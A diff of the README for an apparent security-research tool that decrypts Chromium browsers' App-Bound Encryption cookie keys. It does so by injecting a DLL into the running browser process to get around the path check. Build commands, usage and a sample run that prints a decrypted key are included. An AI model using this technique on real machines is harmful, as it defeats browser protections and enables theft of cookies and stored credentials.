@@ -1,64 +1,73 @@
 # Chrome App-Bound Encryption Decryption
 
-## Overview
+> **Purpose**  
+> Decrypt the **App‑Bound Encrypted (ABE)** keys stored in the *Local State* file of Chromium‑based browsers (**Chrome, Brave, Edge**) **without requiring administrative privileges**.
 
-This tool decrypts **App-Bound Encrypted (ABE)** keys stored in the Local State file of supported Chromium-based browsers, including **Google Chrome, Brave, and Microsoft Edge**. ABE, introduced in Chrome version 127, binds decryption capabilities to specific applications to prevent unauthorized access to sensitive data such as cookies (and potentially passwords and payment information in the future). This tool leverages the internal COM-based **IElevator** service, unique to each browser, to retrieve and decrypt these keys.
+Starting with Chrome 127, Google introduced ABE: cookies (and, in future, passwords & payment data) are encrypted with a key that can only be decrypted by the browser’s own **IElevator** COM service *and* when the calling binary is inside the browser’s installation directory.  
 
-## Supported and tested Browsers
+This project bypasses the path‑validation requirement by **injecting a DLL into the running browser process (CreateRemoteThread + LoadLibrary)** and calling IElevator from there.
 
-- Google Chrome (130.0.6723.91)
-- Brave (1.71.118)
-- Microsoft Edge (130.0.2849.56)
+## Supported & Tested Versions
+
+| Browser | Tested Version (x64 & ARM64) |
+|---------|-----------------------------|
+| **Google Chrome** | 135.0.7049.96 |
+| **Brave** | 1.77.100 |
+| **Microsoft Edge** | 135.0.3179.85 |
 
 > [!NOTE]  
-> This tool should be run from within each browser's application directory due to the path validation constraints of ABE.
+> The injector requires the target browser to be **running**.
 
-## Prerequisites
 
-- **Operating System**: Windows
-- **Build Tools**: Microsoft Visual Studio C++ or compatible compiler (e.g., MSVC `cl` command)
-- **Libraries**: Requires the following libraries: `ole32.lib`, `oleaut32.lib`, `shell32.lib`, `version.lib`, and `comsuppw.lib`.
+## Build Instructions
+
+1. **Clone** the repository and open a *Developer Command Prompt for VS* (or any MSVC‑enabled shell).  
+2. **Compile the DLL** (responsible for the decryption logic):
+
+    ```bash
+    cl /EHsc /LD /O2 /MT chrome_decrypt.cpp ole32.lib oleaut32.lib shell32.lib version.lib comsuppw.lib /link /OUT:chrome_decrypt.dll
+    ```
+3. **Compile the injector** (responsible for DLL injection & console UX):
+
+    ```bash
+    cl /EHsc /O2 /MT chrome_inject.cpp ole32.lib shell32.lib version.lib /link /OUT:chrome_inject.exe
+    ```
+
+Both artifacts (`chrome_inject.exe`, `chrome_decrypt.dll`) must reside in the same folder.
 
 ## Usage
 
-Build using your preferred C++ compiler:
-
 ```bash
-cl /EHsc chrome_decrypt.cpp oleaut32.lib shell32.lib advapi32.lib shlwapi.lib
-```
-
-Place the compiled executable within the Chrome application directory (e.g., C:\Program Files\Google\Chrome\Application) due to path validation constraints inherent in Chrome’s ABE.
-Run the executable from the command line:
-
-```bash
-PS C:\Program Files\Google\Chrome\Application> .\chrome_decrypt.exe chrome
-PS C:\Program Files\BraveSoftware\Brave-Browser\Application> .\chrome_decrypt.exe brave
-PS C:\Program Files (x86)\Microsoft\Edge\Application> .\chrome_decrypt.exe edge
+PS chrome_inject.exe <browser>
 ```
 
 ### Example
 
 ```bash
-PS C:\Program Files\Google\Chrome\Application> .\chrome_decrypt.exe chrome
-----------------------------------------------
-|  Chrome App-Bound Encryption - Decryption  |
-|  Alexander Hagenah (@xaitax)               |
-----------------------------------------------
+PS C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption> chrome_inject.exe chrome
+------------------------------------------------
+|  Chrome App-Bound Encryption Decryption      |
+|  CreateRemoteThread + LoadLibrary Injection  |
+|  v0.3 by @xaitax                             |
+------------------------------------------------
 
-[+] Found Chrome Version: 130.0.6723.91
+[*] Located Chrome with PID 16044
+[+] Chrome Version: 135.0.7049.96
+[+] DLL injected.
 [*] Starting Chrome App-Bound Encryption Decryption process.
 [+] COM library initialized.
 [+] IElevator instance created successfully.
 [+] Proxy blanket set successfully.
 [+] Retrieving AppData path.
 [+] Local State path: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Local State
-[+] Base64 encrypted key extracted.
+[+] Base64 key extracted.
 [+] Finished decoding.
 [+] Key header is valid.
 [+] Encrypted key retrieved: 01000000d08c9ddf0115d1118c7a00c04fc297eb...
 [+] BSTR allocated for encrypted key.
 [+] Decryption successful.
-[+] DECRYPTED KEY: a5e700d6cfb16beee5e9c198789f5cd2d2b5d2debe648fe578a7504a638dc186
+
+[+] Decrypted Key: 97fd6072e90096a6f00dc4cb7d9d6d2a7368122614a99e1cc5aa980fbdba886b
 ```
 
 Further Links:
@@ -66,6 +75,7 @@ Further Links:
 - [Google Security Blog](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
 - [Chrome app-bound encryption Service](https://drive.google.com/file/d/1xMXmA0UJifXoTHjHWtVir2rb94OsxXAI/view)
 - [snovvcrash](https://x.com/snovvcrash)
+- [SilentDev33](https://github.com/SilentDev33/ChromeAppBound-key-injection)
 
 ## Disclaimer
 
